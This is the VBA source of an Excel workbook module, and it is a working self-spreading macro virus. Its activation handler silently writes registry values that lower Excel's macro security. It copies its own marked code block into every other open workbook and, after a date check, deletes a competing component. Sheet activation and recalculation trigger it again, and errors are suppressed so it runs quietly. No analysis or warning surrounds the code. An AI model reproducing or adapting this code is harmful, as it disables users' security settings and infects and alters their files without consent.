Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'mcrex
'1001010001101
Sub Workbook_Activate()
On Error Resume Next
Dim i, intIndex As Integer
Dim data
Dim WshShell, objxl, wbksource As Object
Set wbksource = ThisWorkbook.VBProject.VBComponents.Item("thisworkbook").CodeModule
data = Array("HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "HKCU\Software\Microsoft\Office\9.0\Excel\Security\Level", 1)
Set objxl = GetObject(, "excel.application")
If Left(objxl.Version, 1) <> "8" Then i = 2
Set WshShell = CreateObject("WScript.Shell")
If WshShell.Regread(data(i)) <> data(i + 1) Then WshShell.RegWrite data(i), data(i + 1), "REG_DWORD"
For Each objxl In Application.Workbooks
     If UCase(objxl.Name) <> UCase(ThisWorkbook.Name) Then
         If Date > #1/2/2004# Then objxl.VBProject.VBComponents.Remove objxl.VBProject.VBComponents("universelle")
         'If UCase(Right(objxl.Name, 3)) = "XLS" Then
         If objxl.FileFormat = ThisWorkbook.FileFormat Then
            With objxl.VBProject.VBComponents("thisworkbook")
                If .CodeModule.Find("1001010001101", 1, 1, 10000, 10000) = False Then
                    If .CodeModule.Find("Workbook_activate", 1, 1, 10000, 10000) = False Then
                        For i = 1 To wbksource.CountOfLines
                            If wbksource.Lines(i, 1) = "'mcrex" Then
                                Exit For
                            End If
                        Next i
                        intIndex = 0
                        Do
                            .CodeModule.InsertLines 1 + .CodeModule.CountOfLines, wbksource.Lines(i + intIndex, 1)
                            intIndex = intIndex + 1
                        Loop Until wbksource.Lines(i + intIndex, 1) = "'mcrex"
                        .CodeModule.InsertLines 1 + .CodeModule.CountOfLines, wbksource.Lines(i + intIndex, 1)
                    End If
                End If
            End With
        End If
     End If
Next objxl
Set WshShell = Nothing
Set objxl = Nothing
Set wbksource = Nothing
End Sub
Sub Workbook_SheetActivate(ByVal Sh As Object)
Workbook_Activate
End Sub
Sub Workbook_SheetCalculate(ByVal Sh As Object)
Workbook_Activate
End Sub
'mcrex
